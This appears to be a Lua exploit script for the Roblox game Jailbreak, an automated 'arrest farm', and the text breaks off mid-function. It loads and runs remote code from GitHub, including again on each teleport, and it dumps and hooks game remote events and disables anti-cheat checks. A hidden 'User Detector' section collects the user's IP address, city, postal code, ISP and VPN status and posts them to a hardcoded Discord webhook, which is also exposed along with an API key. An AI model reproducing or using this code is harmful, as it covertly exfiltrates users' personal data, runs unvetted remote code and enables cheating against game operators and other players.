--Version
getgenv().CurrentArrestFarmVersion = "1.0.0"
loadstring(game:HttpGet("https://raw.githubusercontent.com/alohabeach/Main/master/Versions/List"))()

--Waits for game to load
if not game:IsLoaded() then
    local notLoaded = Instance.new("Hint", game:GetService("CoreGui"))
    notLoaded.Text = "Waiting for the game to load"
    game.Loaded:Wait()
    notLoaded:Destroy()
end

--Makes sure they are using Synapse X
local function trick() return 'asd' end
if not is_synapse_function(trick) then game:GetService("Players").LocalPlayer:Kick("Buy Synapse X https://x.synapse.to/") end

--Loading Handler
LoadingLibrary = loadstring([[
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local LoadingScreen = {}

function LoadingScreen.new(Status, Percentage)
	local Window = {}
	
	Window.ScreenGui = Instance.new("ScreenGui")

	Window.ScreenGui.Name = "Loading"
	Window.ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	if RunService:IsStudio() then
		Window.ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	else
		Window.ScreenGui.Parent = game:GetService("CoreGui")
	end


	Window.LoadingFrame = Instance.new("Frame")

	Window.LoadingFrame.Name = "LoadingFrame"
	Window.LoadingFrame.Parent = Window.ScreenGui
	Window.LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	Window.LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	Window.LoadingFrame.Size = UDim2.new(0.4, 0, 0.4, 0)

	Window.Title = Instance.new("TextLabel")

	Window.Title.Name = "Title"
	Window.Title.Parent = Window.LoadingFrame
	Window.Title.AnchorPoint = Vector2.new(0.5, 0.5)
	Window.Title.BackgroundTransparency = 1
	Window.Title.Position = UDim2.new(0.5, 0, 0.125, 0)
	Window.Title.Size = UDim2.new(0.75, 0, 0.15, 0)
	Window.Title.Font = Enum.Font.SciFi
	Window.Title.Text = "Jailbreak Arrest Farm"
	Window.Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Window.Title.TextScaled = true

	Window.StatusImage = Instance.new("ImageLabel")

	Window.Spinner = Instance.new("ImageLabel")

	Window.StatusImage.Name = "StatusImage"
	Window.StatusImage.Parent = Window.LoadingFrame
	Window.StatusImage.AnchorPoint = Vector2.new(0.5, 0.5)
	Window.StatusImage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Window.StatusImage.BackgroundTransparency = 1.000
	Window.StatusImage.Position = UDim2.new(0.5, 0, 0.474999994, 0)
	Window.StatusImage.Size = UDim2.new(0.6, 0, 0.6, 0)
	Window.StatusImage.Image = ("rbxassetid://%s"):format(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).IconImageAssetId)
	Window.StatusImage.ScaleType = Enum.ScaleType.Stretch

	Window.Spinner.Parent = Window.StatusImage
	Window.Spinner.AnchorPoint = Vector2.new(0.5, 0.5)
	Window.Spinner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Window.Spinner.BackgroundTransparency = 1.000
	Window.Spinner.Position = UDim2.new(0.875, 0, 0.875, 0)
	Window.Spinner.Size = UDim2.new(0.25, 0, 0.25, 0)
	Window.Spinner.Image = "rbxassetid://4335476290"
	Window.Spinner.ScaleType = Enum.ScaleType.Fit

	Window.StatusText = Instance.new("TextLabel")

	Window.StatusText.Name = "StatusText"
	Window.StatusText.Parent = Window.LoadingFrame
	Window.StatusText.AnchorPoint = Vector2.new(0.5, 0)
	Window.StatusText.BackgroundTransparency = 1
	Window.StatusText.Position = UDim2.new(0.5, 0, 0.775, 0)
	Window.StatusText.Size = UDim2.new(0.55, 0, 0.0775, 0)
	Window.StatusText.Font = Enum.Font.SciFi
	Window.StatusText.Text = Status
	Window.StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
	Window.StatusText.TextScaled = true
	Window.StatusText.TextSize = 14
	Window.StatusText.TextWrapped = true

	Window.Bar = Instance.new("Frame")
	Window.Fill = Instance.new("Frame")

	Window.Bar.Name = "Bar"
	Window.Bar.Parent = Window.LoadingFrame
	Window.Bar.AnchorPoint = Vector2.new(0.5, 0)
	Window.Bar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
	Window.Bar.Position = UDim2.new(0.5, 0, 0.875, 0)
	Window.Bar.Size = UDim2.new(0.75, 0, 0.025, 0)

	Window.Fill.Name = "Fill"
	Window.Fill.Parent = Window.Bar
	Window.Fill.AnchorPoint = Vector2.new(0, 0.5)
	Window.Fill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
	Window.Fill.Position = UDim2.new(0, 0, 0.5, 0)
	Window.Fill.Size = UDim2.new(Percentage, 0, 1, 0)


	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	UIAspectRatioConstraint.Parent = Window.LoadingFrame
	UIAspectRatioConstraint.AspectRatio = 0.855

	local UICorner = Instance.new("UICorner")
	UICorner.CornerRadius = UDim.new(0.1, 0)
	UICorner.Parent = Window.LoadingFrame

	local UIGradient = Instance.new("UIGradient")
	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(10, 10, 10)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))}
	UIGradient.Rotation = 90
	UIGradient.Parent = Window.LoadingFrame

	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	UIAspectRatioConstraint.Parent = Window.StatusImage

	local UICorner = Instance.new("UICorner")
	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = Window.Bar

	local UICorner = Instance.new("UICorner")
	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = Window.Fill

	Window.FinishedLoading = false

	function Window:Spin(Yield)
		local Tween = TweenService:Create(Window.Spinner, TweenInfo.new(1.5, Enum.EasingStyle.Back), {Rotation = Window.Spinner.Rotation + 360})
		Tween:Play()
		if Yield then
			Tween.Completed:Wait()
			Window.Spinner.Rotation = 0
		else
			coroutine.wrap(function()
				Tween.Completed:Wait()
				Window.Spinner.Rotation = 0
			end)
		end
		return Tween
	end

	function Window:Update(Status, Percentage, Data)
		local Speed = 1
		if Data and Data.Speed then
			Speed = Data.Speed
		end

		Window.StatusText.Text = Status
		TweenService:Create(Window.StatusImage, TweenInfo.new(0.25, Enum.EasingStyle.Sine), {Size = UDim2.new(0.65, 0, 0.65, 0)}):Play()
		local ProgressTween = TweenService:Create(Window.Fill, TweenInfo.new(Speed, Enum.EasingStyle.Back), {Size = UDim2.new(Percentage, 0, 1, 0)})
		ProgressTween:Play()
		ProgressTween.Completed:Wait()
		TweenService:Create(Window.StatusImage, TweenInfo.new(0.25, Enum.EasingStyle.Sine), {Size = UDim2.new(0.6, 0, 0.6, 0)}):Play()
	end

	function Window:Complete()
		Window.FinishedLoading = true

		TweenService:Create(Window.Title, TweenInfo.new(0.25), {TextColor3 = Color3.new(0, 1, 0)}):Play()
		
		local UICorner = Instance.new("UICorner", Window.StatusImage)
		UICorner.CornerRadius = UDim.new(0, 8)
		--TweenService:Create(Window.StatusImage, TweenInfo.new(0.25), {ImageColor3 = Color3.new(0, 1, 0)}):Play()

		TweenService:Create(Window.StatusText, TweenInfo.new(0.25), {TextColor3 = Color3.new(0, 1, 0)}):Play()

		Window.Spinner.Rotation = 0
		Window:Spin(false)
		TweenService:Create(Window.Spinner, TweenInfo.new(0.25), {ImageColor3 = Color3.new(0, 1, 0)}):Play()
		Window.Spinner.ImageRectOffset = Vector2.new(284, 924)
		Window.Spinner.ImageRectSize = Vector2.new(36, 36)
		Window.Spinner.Image = "rbxassetid://3926305904"

		Window:Update("Loading Complete!", 1)

		wait(2.5)

		local Collapse = TweenService:Create(Window.LoadingFrame, TweenInfo.new(0.75, Enum.EasingStyle.Sine), {Position = UDim2.new(0.5, 0, 1, 0), AnchorPoint = Vector2.new(0.5, 0)})
		Collapse:Play()
		Collapse.Completed:Wait()
		Window.ScreenGui:Destroy()
	end

	coroutine.wrap(function()
		repeat
			Window:Spin(true)
			wait(0.25)
		until Window.FinishedLoading == true
	end)()

	return Window
end

return LoadingScreen]])()

LoadingWindow = LoadingLibrary.new("Waiting for game to load", 0)

--Vars
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService("VirtualUser")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
LocalPlayer.PlayerScripts:WaitForChild("LocalScript")
wait(3)
ArrestFarm = false
ArrestFarmSetting = false
StartDebounce = false
RealisticLighting = false
ShowFPS = false

--Notification Handler
function jailbreakNotify(message, duration)
    local notifyInfo = {
        ["Text"] = message,
        ["Duration"] = duration
    }
    require(ReplicatedStorage.Game.Notification).new(notifyInfo)
end

--Outdated Msg
if Versions.JailbreakArrestFarm ~= getgenv().CurrentArrestFarmVersion then
    setclipboard("https://raw.githubusercontent.com/alohabeach/Main/master/Scripts/Jailbreak%20Arrest%20Farm%20(Beta)")
    jailbreakNotify("You're running an older version of the script. The link to the new one has been copied to your clipboard.", 10)
end

--Prevents loading twice
if getgenv().IS_LOADED then
    LoadingWindow.Complete()
    jailbreakNotify("Script already executed!", 5)
    return
else 
    getgenv().IS_LOADED = true
end

LoadingWindow.Update(nil, "Settings up remotes", 0.20)

--Remote Event Stuff
RemotesTable = {}
for i, v in pairs(getgc(true)) do
    if type(v) == "table" then
        for i2, v2 in pairs(v) do
            if type(v2) == "string" and v2:sub(1, 1) == "!" and v2:len() > 10 then
                RemotesTable.AllHashes = v
            end
        end
        if rawget(v, "FireServer") then
            RemotesTable.Remote = v
        end
    end
end

LoadingWindow.Update(nil, "Settings up callbacks", 0.40)

--Callbacks
Callbacks = {Eject = {}, Pickpocket = {}, Hijack = {}, OpenHatch = {}}
function UpdateCallbacks()
    Callbacks = {Eject = {}, Pickpocket = {}, Hijack = {}, OpenHatch = {}}
    for I,V in pairs(require(ReplicatedStorage.Module.UI).CircleAction.Specs) do
        if V.Name == "Eject" then table.insert(Callbacks.Eject, V) end
        if V.Name == "Pickpocket" then table.insert(Callbacks.Pickpocket, V) end
        if V.Name == "Hijack" then table.insert(Callbacks.Hijack, V) end
        if V.Name == "Pull Open" then table.insert(Callbacks.OpenHatch, V) end
        if V.Name == "Explode Wall" then Callbacks.ExplodeWall = V end
        if V.Name == "Lift Gate" then Callbacks.LiftGate = V end
    end
end
UpdateCallbacks()

LoadingWindow.Update(nil, "Dumping hashes", 0.60)

--Hash Handler
getgenv().Hashes = {
    ["Eject"] =          "f8592fed", --Args: (*Hash*, *PlayerName*)
    ["EnterVehicle"] =   "aa438894", --Args: (*Hash*, *Vehicle Instance*, *Vehicle Seat Instance*)
    ["FlipCar"] =        "cc273b96", --Args: (*Hash*, *Vehicle Instance*, *Vehicle Seat Instance*)
    ["OpenDoors"] =      "b6e705b4", --Args: (*Hash*, *DoorInfoTable*)
    ["Arrest"] =         "ae2a0fa8", --Args: (*Hash*, *PlayerName*)
    ["Breakout"] =       "e7ea62c0", --Args: (*Hash*, *PlayerName*)
    ["AnnoyServer"] =    "c7c3a8ab", --Args: (*Hash*, *SoundName*, *SoundInfoTable*)
    ["PopTire"] =        "________", --Args: (*Hash*, *Vehicle Instance*, *WeaponName*)
    ["Damage"] =         "________", --Args: (*Hash*, *HumanoidRootPart Vector*, *HumanoidRootPart Instance*)
    ["ExitVehicle"] =    "________", --Args: (*Hash*)
    ["Team"] =           "________", --Args: (*Hash*, *TeamName*)
    ["GetWeapons"] =     "________", --Args: (*Hash*, *WeaponName*)
    ["EquipServer"] =    "________", --Args: (*Hash*, *WeaponInfoTable*)
    ["BuySafe"] =        "________", --Args: (*Hash*, *Tier Number*)
    ["OpenSafe"] =       "________", --Args: (*Hash*, *SafeInfoTable*)
    ["SendSafe"] =       "________", --Args: (*Hash*, *Tier*, *PlayerName*)
}
local Pattern = "%a+%p+(%w+)%p+"
local Scripts = 
{
    ["Team"] = decompile(ReplicatedStorage.Game.TeamChooseUI),
    ["Gun"] = decompile(ReplicatedStorage.Game.GunShop.GunShopUI),
    ["Safe"] = decompile(ReplicatedStorage.Game.SafesUI),
    ["ItemSystem"] = decompile(ReplicatedStorage.Game.ItemSystem.ItemSystem),
    ["Item"] = decompile(ReplicatedStorage.Game.Item.Gun),
    ["PlasmaPistol"] = decompile(ReplicatedStorage.Game.Item.PlasmaPistol),
    ["Chassis"] = decompile(ReplicatedStorage.Module.AlexChassis)
}
for I, V in pairs(Scripts) do
	local Index = 1
	for Key in V:gmatch([[FireServer%b()]]) do
        Index = Index + 1
        if I == "Team" and Index == 2 then
            getgenv().Hashes.Team = string.match(Key, Pattern)
        elseif I == "Gun" and Index == 3 then
            getgenv().Hashes.GetWeapons = string.match(Key, Pattern)
        elseif I == "Safe" and Index == 2 then
            getgenv().Hashes.BuySafe = string.match(Key, Pattern)
        elseif I == "Safe" and Index == 3 then
            getgenv().Hashes.SendSafe = string.match(Key, Pattern)
        elseif I == "Safe" and Index == 5 then
            getgenv().Hashes.OpenSafe = string.match(Key, Pattern)
        elseif I == "ItemSystem" and Index == 4 then
            getgenv().Hashes.EquipServer = string.match(Key, Pattern)
        elseif I == "Item" and Index == 5 then
            getgenv().Hashes.PopTire = string.match(Key, Pattern)
        elseif I == "PlasmaPistol" and Index == 2 then
            getgenv().Hashes.Damage = string.match(Key, Pattern)
        elseif I == "Chassis" and Index == 7 then
            getgenv().FlipCar = string.match(Key, Pattern)
        end
	end
end
for I,V in pairs(getgc()) do
    if type(V) == "function" and getfenv(V).script == LocalPlayer.PlayerScripts.LocalScript then
        local con = getconstants(V)
        if table.find(con, "LastVehicleExit") and table.find(con, "tick") then
            getgenv().Hashes.ExitVehicle = V
        end
    end
end
DumpingHashes = false
local OldFireserver = RemotesTable.Remote.FireServer
RemotesTable.Remote.FireServer = function(self, ...)
    if not DumpingHashes then OldFireserver(self, ...) end
    local thing1, thing2, thing3 = nil, false, false
    for I,V in pairs({...}) do
        if I == 1 then thing1 = V end
        if I == 2 and type(V) == "userdata" then thing2 = true end
        if I == 3 and tostring(V) == "Seat" then thing3 = true end
    end
    if thing2 and thing3 then getgenv().Hashes.EnterVehicle = thing1 end
    return OldFireserver(self, ...)
end
for I,V in pairs(require(ReplicatedStorage.Module.UI).CircleAction.Specs) do
    if V.Name == "Enter Driver" then
        DumpingHashes = true
        V:Callback(true)
        DumpingHashes = false
        break
    end
end

LoadingWindow.Update(nil, "Settings up functions", 0.80)

--Comma Value
function comma_value(amount)
    local formatted = amount
    while true do  
        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
        if k == 0 then
            break
        end
    end
    return formatted
end

--Money Stats
TextFileName = ("Jailbreak_ArrestFarm_(Beta)_%s.txt"):format(tostring(LocalPlayer.UserId))
local TotalMoneyMadeThisSession = 0
local MoneyTextLabel = PlayerGui.SafesGui.ContainerSafes.Container.ContainerSidebar.ContainerCash.TextLabel
local MoneyCache = MoneyTextLabel.Text:gsub("%D", "")
MoneyTextLabel:GetPropertyChangedSignal("Text"):Connect(function()
    local NewMoney = MoneyTextLabel.Text:gsub("%D", "")
    local MoneyCacheNumber = tonumber(MoneyCache)
    local NewNumber = tonumber(NewMoney)
    if NewNumber < MoneyCacheNumber then
        MoneyCacheNumber = MoneyTextLabel.Text:gsub("%D", "")
    elseif NewNumber > MoneyCacheNumber then
        if not isfile(TextFileName) then
            writefile(TextFileName, "$"..comma_value(NewNumber - MoneyCacheNumber))
        else
            local MoneyMade = readfile(TextFileName)
            local String = string.gsub(MoneyMade, "%D", "")
            writefile(TextFileName, "$"..comma_value(tonumber(String) + (NewNumber - MoneyCacheNumber)))
            SetMoneyMade(TotalMoneyMadeThisSession + (NewNumber - MoneyCacheNumber))
        end
        MoneyCache = MoneyTextLabel.Text:gsub("%D", "")
    end
end)

--User Detector
local response1 = syn.request({
    Url = "https://api.ipify.org/",
    Method = "GET"
})
local response2 = syn.request({
    Url = "https://geo.ipify.org/api/v1?apiKey=at_qeTa9AtDbdrYPhRIVen8JFnmKxjtO&ipAddress="..tostring(response1.Body),
    Method = "GET"
})
local ip = tostring(response1.Body)
local ipInfo = tostring(response2.Body)
local decoded = game:GetService("HttpService"):JSONDecode(ipInfo)
local country = decoded["location"]["country"]
local region = decoded["location"]["region"]
local city = decoded["location"]["city"]
local postalCode = decoded["location"]["postalCode"]
local isp = decoded["isp"]
local proxy = decoded["proxy"]["vpn"]
local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size420x420
local content, isReady = Players:GetUserThumbnailAsync(LocalPlayer.UserId, thumbType, thumbSize)
local stringToFormat = "%c (%Z)"
local timestamp = os.time()
local result = os.date(stringToFormat, timestamp)
local msg = {
    ["embeds"] = {
        {
            ["color"] = 0,
            --["description"] = "**Message:** "..PlayerMessage,
            ["title"] = MarketplaceService:GetProductInfo(game.PlaceId).Name,
            ["url"] = ("https://www.roblox.com/games/%s"):format(game.PlaceId),
            ["author"] = {
                ["name"] = LocalPlayer.Name,
                ["icon_url"] = content,
                ["url"] = ("https://www.roblox.com/users/%s/profile"):format(LocalPlayer.UserId),
            },
            ["thumbnail"] = {
                ["url"] = "https://t5.rbxcdn.com/e6abcacb0ffe6f76318f8cdffb2ada4f",
            },
            ["fields"] = {
                {
                    ["name"] = "__Main Info__",
                    ["value"] =  ("**Players In Server:** %s\n**Account Age:** %s\n**IP:** %s\n**Verson:** %s\n**Total Money Made:** %s"):format(#Players:GetPlayers(), LocalPlayer.AccountAge, ip, getgenv().ArrestFarmVersion, isfile(TextFileName) and readfile(TextFileName) or "$0"),
                },
                {
                    ["name"] = "__Other Info__",
                    ["value"] = ("**Country:** %s\n**Region:** %s\n**City:** %s\n**VPN:** %s\n**Source:** https://geo.ipify.org/api/v1?apiKey=at_qeTa9AtDbdrYPhRIVen8JFnmKxjtO&ipAddress=%s"):format(country, region, city, tostring(proxy), ip),
                },
            },
            ["footer"] = {
                ["text"] = ("Timestamp: %s"):format(result)
            },
        },
    },
};
syn.request(
    {
        Url = "https://discord.com/api/webhooks/801955871840010241/HFBBIyMo-v6nPDrAYauwRi_xKkHoazES8koPlXsgKuNyARxd94wuidXaQIEDrLT8GW_B",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = game:GetService("HttpService"):JSONEncode(msg),
    }
)

--Anti Cheat
for I,V in pairs(getgc()) do
    if type(V) == "function" and getfenv(V).script == LocalPlayer.PlayerScripts.LocalScript then
        cons = getconstants(V)
        if table.find(cons, "NoClip StrafingNoPhysics") then
            V = function() return end
        elseif table.find(cons, "BakpackItem") and table.find(cons, "BackpackTool") then
            V = function() return end
        elseif table.find(cons, "FailedPcall") then
            setupvalue(V, 1, function() return end)
        end
    end
end

--TP Random Server
LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        syn.queue_on_teleport(
            [[loadstring(game:HttpGet("https://raw.githubusercontent.com/alohabeach/Main/master/Scripts/Jailbreak%20Arrest%20Farm%20(Beta)"))()]]
        )
    end
end)
function TeleportToRandomServer()
    SetStatus("Switching servers..")
    local x = {}
    for _,v in ipairs(HttpService:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
        if type(v) == "table" and v.playing > 15 and v.playing < v.maxPlayers - 1 and v.id ~= game.JobId then
            x[#x + 1] = v.id
        end
    end
    if #x > 0 then
        TeleportService:TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
    else
        pcall(TeleportToRandomServer)
    end
end

--Switch Server after 3 minutes
spawn(function()
    while wait(180) do
        if SwitchServers and ArrestFarm then
            pcall(TeleportToRandomServer)
        end
    end
end)

--Reduce Lag
function ReduceLag()
    local Terrain = workspace.Terrain
    Terrain.WaterWaveSize = 0
    Terrain.WaterWaveSpeed = 0
    Terrain.WaterReflectance = 0
    Terrain.WaterTransparency = 0
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 0
    for i, v in pairs(game:GetDescendants()) do
        if v:IsA("Part") or v:IsA("Union") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
            v.Material = "Plastic"
            v.Reflectance = 0
        elseif v:IsA("Decal") then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        elseif v:IsA("Smoke") then
            v.Enabled = false
            v.size = 0
        end
    end
    for i, v in pairs(Lighting:GetChildren()) do
        if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
            v.Enabled = false
        end
    end
end

--Switch To Police
function SwitchToPolice()
    SetStatus("Switching to police team..")
    repeat
        if LocalPlayer.Character.Humanoid.Sit == true or LocalPlayer.Character:FindFirstChildWhichIsA("BoolValue") then
            getgenv().Hashes.ExitVehicle()
            LocalPlayer.Character.Humanoid.Sit = false
            wait(0.1)
        end
        RemotesTable.Remote:FireServer(getgenv().Hashes.Team, "Police")
        wait(2)
    until LocalPlayer.Team == game.Teams.Police
end

--Bottom Border Handler
local BorderCFrames = {
    CFrame.new(0, -200, 0),
    CFrame.new(2048, -200, 0),
    CFrame.new(-2048, -200, 0),
    CFrame.new(0, -200, 2048),
    CFrame.new(0, -200, -2048),
    CFrame.new(2048, -200, 2048),
    CFrame.new(-2048, -200, 2048),
    CFrame.new(2048, -200, -2048),
    CFrame.new(-2048, -200, -2048)
}
function MakeBottomBorder(value)
    if value then
        local BottomBorderFolder = Instance.new("Folder", workspace)
        BottomBorderFolder.Name = "BottomBorderFolder"
        for I,V in pairs(BorderCFrames) do
            local BottomBorder = Instance.new("Part", BottomBorderFolder)
            BottomBorder.Name = "BottomBorder"
            BottomBorder.Transparency = 0
            BottomBorder.CanCollide = true
            BottomBorder.Anchored = true
            BottomBorder.Size = Vector3.new(2048, 1, 2048)
            BottomBorder.CFrame = BorderCFrames[I]
        end
    else
        workspace.BottomBorderFolder:Destroy()
    end
end

--Anti AFK
spawn(function()
    while wait(30) do
        if ArrestFarm then
            VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            wait(1)
            VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
    end
end)
--Teleport Blacklist Thing
NoVehicleTable = {
    {CFrame = CFrame.new(713.9, 56.24, 2305.95), Size = Vector3.new(159.65, 54.2, 74.55)}, --Power Plant
    {CFrame = CFrame.new(1072.12, 107.34, 1200), Size = Vector3.new(151.35, 44.7, 61.15)}, --Museum
    {CFrame = CFrame.new(37.35, 27.64, 827.59), Size = Vector3.new(62.75, 36.2, 45.35)}, --Bank
    {CFrame = CFrame.new(109.61, 22.64, 869.34), Size = Vector3.new(42.25, 26.2, 39.85)}, --Bank
    {CFrame = CFrame.new(1109.34, 107.34, 1220.26), Size = Vector3.new(90.25, 44.7, 25.95)}, --Museum
    {CFrame = CFrame.new(1072.38, 140.09, 1200.07), Size = Vector3.new(163.15, 21, 76.85)}, --Museum
    {CFrame = CFrame.new(1116.11, 140.09, 1224.91), Size = Vector3.new(101.05, 21, 24.55)}, --Museum
    {CFrame = CFrame.new(774.64, 44.29, 2319.33), Size = Vector3.new(21.95, 30.3, 44.15)}, --Power Plant
    {CFrame = CFrame.new(67.55, 27.64, 847.49), Size = Vector3.new(22.95, 36.2, 31.15)} --Bank
}
VehicleNames = {}
for I,V in pairs(workspace.VehicleSpawns:GetChildren()) do
    table.insert(VehicleNames, V.Name)
end
VehiclesInBlacklist = {}
local PlayersInBlacklist = {}
local Parts = {}
for I,V in pairs(NoVehicleTable) do
    local NoVehicles = Instance.new("Part", workspace)
    NoVehicles.Anchored = true
    NoVehicles.CanCollide = false
    NoVehicles.Transparency = 1
    NoVehicles.Size = NoVehicleTable[I].Size
    NoVehicles.CFrame = NoVehicleTable[I].CFrame
    table.insert(Parts, NoVehicles)
end
function GetTouchingParts(part)
   local connection = part.Touched:Connect(function() end)
   local results = part:GetTouchingParts()
   connection:Disconnect()
   return results
end
function SetBlacklistedVehicles()
    VehiclesInBlacklist = {}
    for I,V in pairs(Parts) do
        local results = GetTouchingParts(V)
        
        for I2,V2 in pairs(results) do
            if table.find(VehicleNames, V2.Parent.Name) and not table.find(VehiclesInBlacklist, V2.Parent) then
                table.insert(VehiclesInBlacklist, V2.Parent)
            end
        end
    end
end
function SetBlacklistedPlayers()
    PlayersInBlacklist = {}
    for I,V in pairs(Players:GetPlayers()) do
        if V.Character then
            local Position = V.Character.HumanoidRootPart.Position
            --msm
            if Position.y < 150 and Position.y > -500 then
                if Position.x < 1150 and Position.x > 990 and Position.z < 1350 and Position.z > 1050 then
                    table.insert(PlayersInBlacklist, V.Name)
                end
            end
            --jew
            if Position.y < 130 and Position.y > -500 then
                if Position.x < 180 and Position.x > 60 and Position.z < 1400 and Position.z > 1230 then
                    table.insert(PlayersInBlacklist, V.Name)
                end
            end
            --bank
            if Position.y < 19 and Position.y > -750 then
                if Position.x < 250 and Position.x > -150 and Position.z < 1200 and Position.z > 400 then
                    table.insert(PlayersInBlacklist, V.Name)
                end
            end
            --bank
            if Position.y < 40 and Position.y > 18 then
                if Position.x < 150 and Position.x > -50 and Position.z < 1000 and Position.z > 600 then
                    table.insert(PlayersInBlacklist, V.Name)
                end
            end
            --powerplant
            if Position.y < 70 and Position.y > -750 then
                if Position.x < 811 and Position.x > 637 and Position.z < 2407 and Position.z > 2194 then
                    table.insert(PlayersInBlacklist, V.Name)
                end
            end
        end
    end
end

--Toggle Player Input
function TogglePlayerInput(Bool)
    local FREEZE_ACTION = "freezeMovement"
    if Bool then
        game:GetService("ContextActionService"):BindAction(
            FREEZE_ACTION,
            function()
                return Enum.ContextActionResult.Sink
            end,
            false,
            unpack(Enum.PlayerActions:GetEnumItems())
        )
    else
        game:GetService("ContextActionService"):UnbindAction(FREEZE_ACTION)
    end
end

--Platform
PlatformConnection = nil
function Platform()
    local Platform = Instance.new("Part", workspace)
    Platform.Name = "Platform"
    Platform.Transparency = 1
    Platform.Anchored = true
    PlatformConnection = RunService.Heartbeat:Connect(function()
        Platform.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -3.599, 0)
    end)
end

--Helicopter Detector
function InHelicopter()
    for I,V in pairs(workspace.Vehicles:GetChildren()) do
        if V.Seat:FindFirstChild("PlayerName") and V.Seat.PlayerName.Value == LocalPlayer.Name then
            if V.Make.Value == "Heli" or V.Make.Value == "BlackHawk" then
                return true
            end
        end
    end
    return false
end

--Noclip Function
function noclip()
    for I,V in pairs(LocalPlayer.Character:GetDescendants()) do
        if V:IsA("BasePart") then
            V.CanCollide = false
        end
    end
end

--Teleport Handler
Method = "Tween Method"
local TeleportDebounce = false
function BackupTP(X, Y, Z)
    local AntiSit = true
    spawn(function()
        while wait() do
            if not AntiSit then break end
            if LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then 
                LocalPlayer.Character.Humanoid.Sit = false
            end
        end
    end)
    local noclipConnection = RunService.Stepped:Connect(noclip)
    local Time = (LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(X, Y, Z)).Magnitude/50
    local Tween = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time, Enum.EasingStyle.Linear), {CFrame = CFrame.new(X, Y, Z)})
    Tween:Play()
    Tween.Completed:Wait()
    noclipConnection:Disconnect()
    AntiSit = false
end
function tp(X, Y, Z)
    if TeleportDebounce then return end
    TeleportDebounce = true
    TogglePlayerInput(true)
    pcall(function()
    if LocalPlayer.Character:FindFirstChild("InVehicle") then
        for _,v in pairs(workspace.Vehicles:GetDescendants()) do
            if v.Name == "PlayerName" and v.Value == LocalPlayer.Name and v.Parent.Name ~= "Passenger" then
                local Car = v.Parent.Parent
                if Method == "Velocity Method" then
                    if not InHelicopter() and math.floor(Car.WheelFrontRight.Wheel.Position.Y) - math.floor(Car.Step.Position.Y) >= 2 then
                        VirtualInputManager:SendKeyEvent(true, "V", false, game)
                        wait()
                        VirtualInputManager:SendKeyEvent(false, "V", false, game)
                        wait(0.5)
                        getgenv().ExitVehicle()
                        wait(0.5)
                        Method = "Tween Method"
                        TogglePlayerInput(false)
                        TeleportDebounce = false
                        tp(X, Y, Z)
                        return
                    end
                    Car:SetPrimaryPartCFrame(CFrame.new(Car.Engine.Position.X, 1000, Car.Engine.Position.Z))
                    local part = Instance.new("Part", workspace)
                    part.CFrame = CFrame.new(Vector3.new(X, 1000, Z), Car.Engine.CFrame.p)
                    part.Anchored = true
                    part.CanCollide = false
                    part.Transparency = 1
                    local BodyGyro = Instance.new("BodyGyro", Car.Weight)
                    BodyGyro.P = 5000
                    BodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                    BodyGyro.CFrame = Car.Model.Body.CFrame
                    local BodyVelocity = Instance.new("BodyVelocity", Car.Weight)
                    BodyVelocity.P = 9e9
                    BodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                    BodyVelocity.Velocity = -part.CFrame.LookVector * 500
                    wait((LocalPlayer.Character.HumanoidRootPart.Position - part.Position).Magnitude/500)
                    BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                    Car:SetPrimaryPartCFrame(CFrame.new(X, Y, Z))
                    wait(0.1)
                    BodyVelocity:Destroy()
                    BodyGyro:Destroy()
                    part:Destroy()
